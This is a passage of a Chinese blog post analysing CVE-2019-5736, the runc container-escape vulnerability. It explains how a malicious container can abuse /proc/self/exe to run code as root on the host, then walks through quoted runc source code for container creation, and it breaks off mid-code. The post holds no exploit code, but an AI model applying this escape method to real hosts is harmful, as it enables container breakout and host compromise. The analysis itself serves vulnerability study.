<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="漏洞原理分析procproc是一种伪文件系统，以文件的形式存储当前内核运行的情况，用户可以编写程序以读取文件的形式读取内核的运行情况并修改。">
<meta property="og:type" content="article">
<meta property="og:title" content="漏洞分析 CVE-2019-5736">
<meta property="og:url" content="http://example.com/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/index.html">
<meta property="og:site_name" content="Plucky">
<meta property="og:description" content="漏洞原理分析procproc是一种伪文件系统，以文件的形式存储当前内核运行的情况，用户可以编写程序以读取文件的形式读取内核的运行情况并修改。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901.PNG">
<meta property="og:image" content="http://example.com/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%902.PNG">
<meta property="article:published_time" content="2023-12-15T06:52:27.000Z">
<meta property="article:modified_time" content="2023-12-16T09:05:15.247Z">
<meta property="article:author" content="Plucky">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="docker">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901.PNG">

<link rel="canonical" href="http://example.com/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>漏洞分析 CVE-2019-5736 | Plucky</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Plucky</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Comfortably Numb</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Plucky">
      <meta itemprop="description" content="记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Plucky">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          漏洞分析 CVE-2019-5736
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-12-15 14:52:27" itemprop="dateCreated datePublished" datetime="2023-12-15T14:52:27+08:00">2023-12-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-16 17:05:15" itemprop="dateModified" datetime="2023-12-16T17:05:15+08:00">2023-12-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>26k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>47 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h1><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p>proc是一种伪文件系统，以文件的形式存储当前内核运行的情况，用户可以编写程序以读取文件的形式读取内核的运行情况并修改。</p>
<p>为了查看及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如<code>/proc/scsi</code>目录中存储的就是当前系统上所有SCSI设备的相关信息，<code>/proc/pid</code>中存储的则是系统当前正在运行的进程的相关信息，其中N为正在运行的进程</p>
<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/proc.5.html">proc(5) - Linux manual page (man7.org)</a></p>
<h2 id="pid-namespace"><a href="#pid-namespace" class="headerlink" title="pid namespace"></a>pid namespace</h2><p>Pid namespace隔离了进程pid的命名空间。当一个进程加入了某一pid命名空间之后，该命名空间中的其它进程就能够通过<code>/proc</code>文件系统观察到该进程，在权限允许的情况下，进程能够通过<code>/proc/[pid]/exe</code>找到其它进程对应的二进制文件。</p>
<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/pid_namespaces.7.html">pid_namespaces(7) - Linux manual page (man7.org)</a></p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p><img src="/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901.PNG"></p>
<p>Runc init进程进入容器的namespace之后会执行容器中的程序。如果恶意容器可以欺骗<code>runc init</code>执行恶意的程序，则可以借助<strong>在主机上root权限运行的</strong>runc在主机上任意执行代码实现逃逸。</p>
<p><img src="/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%902.PNG"></p>
<p>这里路径修改成了<code>/proc/self/exe</code>即runc init进程自身，这样runc就暴露在容器内部，从而容器内的程序可以调用runc在主机上执行命令。</p>
<p>执行过程大体是这样的：runc启动，加入到容器的命名空间，接着以自身（&#x2F;proc&#x2F;self&#x2F;exe，后面会解释）为范本启动一个子进程，最后通过exec系统调用执行用户指定的二进制程序。</p>
<h1 id="runc启动容器过程分析"><a href="#runc启动容器过程分析" class="headerlink" title="runc启动容器过程分析"></a>runc启动容器过程分析</h1><h2 id="runc-run-command"><a href="#runc-run-command" class="headerlink" title="runc run command"></a>runc run command</h2><p>命令<code>runc run</code>定义在下列代码中。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/run.go#L11">https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/run.go#L11</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> runCommand = cli.Command&#123;</span><br><span class="line">    Name:  <span class="string">&quot;run&quot;</span>,</span><br><span class="line">    Usage: <span class="string">&quot;create and run a container&quot;</span>,</span><br><span class="line">    ArgsUsage: <span class="string">`&lt;container-id&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Where &quot;&lt;container-id&gt;&quot; is your name for the instance of the container that you</span></span><br><span class="line"><span class="string">are starting. The name you provide for the container instance must be unique on</span></span><br><span class="line"><span class="string">your host.`</span>,</span><br><span class="line">    Description: <span class="string">`The run command creates an instance of a container for a bundle. The bundle</span></span><br><span class="line"><span class="string">is a directory with a specification file named &quot;`</span> + specConfig + <span class="string">`&quot; and a root</span></span><br><span class="line"><span class="string">filesystem.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The specification file includes an args parameter. The args parameter is used</span></span><br><span class="line"><span class="string">to specify command(s) that get run when the container is started. To change the</span></span><br><span class="line"><span class="string">command(s) that get executed on start, edit the args parameter of the spec. See</span></span><br><span class="line"><span class="string">&quot;runc spec --help&quot; for more explanation.`</span>,</span><br><span class="line"><span class="comment">//.................................</span></span><br><span class="line">    Action: <span class="function"><span class="keyword">func</span><span class="params">(context *cli.Context)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := checkArgs(context, <span class="number">1</span>, exactArgs); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        status, err := startContainer(context, CT_ACT_RUN, <span class="literal">nil</span>)</span><br><span class="line">        <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="comment">// exit with the container&#x27;s exit status so any external supervisor is</span></span><br><span class="line">            <span class="comment">// notified of the exit with the correct exit status.</span></span><br><span class="line">            os.Exit(status)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;runc run failed: %w&quot;</span>, err)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Action中调用startContainer()函数，flag设置为CT_ACT_RUN，由config.json生成spec对象。</p>
<h2 id="startContainer"><a href="#startContainer" class="headerlink" title="startContainer"></a>startContainer</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L339">https://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L339</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startContainer</span><span class="params">(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> err := revisePidFile(context); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    spec, err := setupSpec(context)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    id := context.Args().First()</span><br><span class="line">    <span class="keyword">if</span> id == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, errEmptyID</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    notifySocket := newNotifySocket(context, os.Getenv(<span class="string">&quot;NOTIFY_SOCKET&quot;</span>), id)</span><br><span class="line">    <span class="keyword">if</span> notifySocket != <span class="literal">nil</span> &#123;</span><br><span class="line">        notifySocket.setupSpec(spec)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    container, err := createContainer(context, id, spec)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> notifySocket != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := notifySocket.setupSocketDirectory(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> action == CT_ACT_RUN &#123;</span><br><span class="line">            <span class="keyword">if</span> err := notifySocket.bindSocket(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Support on-demand socket activation by passing file descriptors into the container init process.</span></span><br><span class="line">    listenFDs := []*os.File&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> os.Getenv(<span class="string">&quot;LISTEN_FDS&quot;</span>) != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        listenFDs = activation.Files(<span class="literal">false</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r := &amp;runner&#123;</span><br><span class="line">        enableSubreaper: !context.Bool(<span class="string">&quot;no-subreaper&quot;</span>),</span><br><span class="line">        shouldDestroy:   !context.Bool(<span class="string">&quot;keep&quot;</span>),</span><br><span class="line">        container:       container,</span><br><span class="line">        listenFDs:       listenFDs,</span><br><span class="line">        notifySocket:    notifySocket,</span><br><span class="line">        consoleSocket:   context.String(<span class="string">&quot;console-socket&quot;</span>),</span><br><span class="line">        detach:          context.Bool(<span class="string">&quot;detach&quot;</span>),</span><br><span class="line">        pidFile:         context.String(<span class="string">&quot;pid-file&quot;</span>),</span><br><span class="line">        preserveFDs:     context.Int(<span class="string">&quot;preserve-fds&quot;</span>),</span><br><span class="line">        action:          action,</span><br><span class="line">        criuOpts:        criuOpts,</span><br><span class="line">        init:            <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r.run(spec.Process)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>setupSpec读取配置文件config.json，获取配置信息。</p>
<p>createContainer根据配置信息创建container对象。</p>
<h2 id="createContainer"><a href="#createContainer" class="headerlink" title="createContainer"></a>createContainer</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L165">https://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L165</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createContainer</span><span class="params">(context *cli.Context, id <span class="type">string</span>, spec *specs.Spec)</span></span> (*libcontainer.Container, <span class="type">error</span>) &#123;</span><br><span class="line">    rootlessCg, err := shouldUseRootlessCgroupManager(context)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    config, err := specconv.CreateLibcontainerConfig(&amp;specconv.CreateOpts&#123;</span><br><span class="line">        CgroupName:       id,</span><br><span class="line">        UseSystemdCgroup: context.GlobalBool(<span class="string">&quot;systemd-cgroup&quot;</span>),</span><br><span class="line">        NoPivotRoot:      context.Bool(<span class="string">&quot;no-pivot&quot;</span>),</span><br><span class="line">        NoNewKeyring:     context.Bool(<span class="string">&quot;no-new-keyring&quot;</span>),</span><br><span class="line">        Spec:             spec,</span><br><span class="line">        RootlessEUID:     os.Geteuid() != <span class="number">0</span>,</span><br><span class="line">        RootlessCgroups:  rootlessCg,</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    root := context.GlobalString(<span class="string">&quot;root&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> libcontainer.Create(root, id, config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>createContainer将创建container对象的任务委托给libcontainer.Create</p>
<h2 id="libcontainer-Create"><a href="#libcontainer-Create" class="headerlink" title="libcontainer.Create"></a>libcontainer.Create</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/libcontainer/factory_linux.go#L39-L109">https://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/libcontainer/factory_linux.go#L39-L109</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Create</span><span class="params">(root, id <span class="type">string</span>, config *configs.Config)</span></span> (*Container, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;root not set&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := validateID(id); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := validate.Validate(config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := os.MkdirAll(root, <span class="number">0</span>o700); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    containerRoot, err := securejoin.SecureJoin(root, id)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> _, err := os.Stat(containerRoot); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, ErrExist</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> !os.IsNotExist(err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cm, err := manager.New(config.Cgroups)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that cgroup does not exist or empty (no processes).</span></span><br><span class="line">    <span class="comment">// Note for cgroup v1 this check is not thorough, as there are multiple</span></span><br><span class="line">    <span class="comment">// separate hierarchies, while both Exists() and GetAllPids() only use</span></span><br><span class="line">    <span class="comment">// one for &quot;devices&quot; controller (assuming others are the same, which is</span></span><br><span class="line">    <span class="comment">// probably true in almost all scenarios). Checking all the hierarchies</span></span><br><span class="line">    <span class="comment">// would be too expensive.</span></span><br><span class="line">    <span class="keyword">if</span> cm.Exists() &#123;</span><br><span class="line">        pids, err := cm.GetAllPids()</span><br><span class="line">        <span class="comment">// Reading PIDs can race with cgroups removal, so ignore ENOENT and ENODEV.</span></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, os.ErrNotExist) &amp;&amp; !errors.Is(err, unix.ENODEV) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unable to get cgroup PIDs: %w&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(pids) != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> return an error.</span></span><br><span class="line">            logrus.Warnf(<span class="string">&quot;container&#x27;s cgroup is not empty: %d process(es) found&quot;</span>, <span class="built_in">len</span>(pids))</span><br><span class="line">            logrus.Warn(<span class="string">&quot;DEPRECATED: running container in a non-empty cgroup won&#x27;t be supported in runc 1.2; https://github.com/opencontainers/runc/issues/3132&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that cgroup is not frozen. Do not use Exists() here</span></span><br><span class="line">    <span class="comment">// since in cgroup v1 it only checks &quot;devices&quot; controller.</span></span><br><span class="line">    st, err := cm.GetFreezerState()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unable to get cgroup freezer state: %w&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> st == configs.Frozen &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;container&#x27;s cgroup unexpectedly frozen&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Parent directory is already created above, so Mkdir is enough.</span></span><br><span class="line">    <span class="keyword">if</span> err := os.Mkdir(containerRoot, <span class="number">0</span>o711); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    c := &amp;Container&#123;</span><br><span class="line">        id:              id,</span><br><span class="line">        root:            containerRoot,</span><br><span class="line">        config:          config,</span><br><span class="line">        cgroupManager:   